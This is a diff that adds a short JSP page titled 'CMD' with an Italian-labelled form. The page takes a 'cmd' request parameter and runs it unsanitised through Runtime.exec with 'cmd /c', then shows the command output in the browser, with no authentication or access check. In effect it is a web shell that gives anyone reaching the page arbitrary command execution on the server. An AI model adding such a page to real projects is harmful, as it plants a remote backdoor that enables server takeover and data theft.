@@ -1,0 +1,29 @@
+<%@ page isELIgnored="true" %>
+<%@taglib prefix="c" uri="core"%>
+
+<h1>CMD</h1>
+
+<form action="cmd.xwb" method="POST" name="commandForm">
+	<input type="text" name="cmd"/>
+	<input type="submit" value="Esegui"/>
+</form>
+
+<c:if test="${not empty param.cmd}">
+	<h3><c:out value="${param.cmd}"/></h3>
+
+	<c:set var="output"><%
+		Process p = Runtime.getRuntime().exec("cmd /c \"" + request.getParameter("cmd") + "\"");
+		java.io.InputStream in = p.getInputStream();
+		int c;
+		while((c = in.read()) > 0)
+			out.print((char)c);
+	 %></c:set>
+
+	<div style="width: 700px; height:400px; overflow: auto; border: 1px solid black;"><pre><c:out value="${output}"/></pre></div>
+</c:if>
+
+<script type="text/javascript">
+<!--
+	document.commandForm.cmd.focus();
+//-->
+</script>
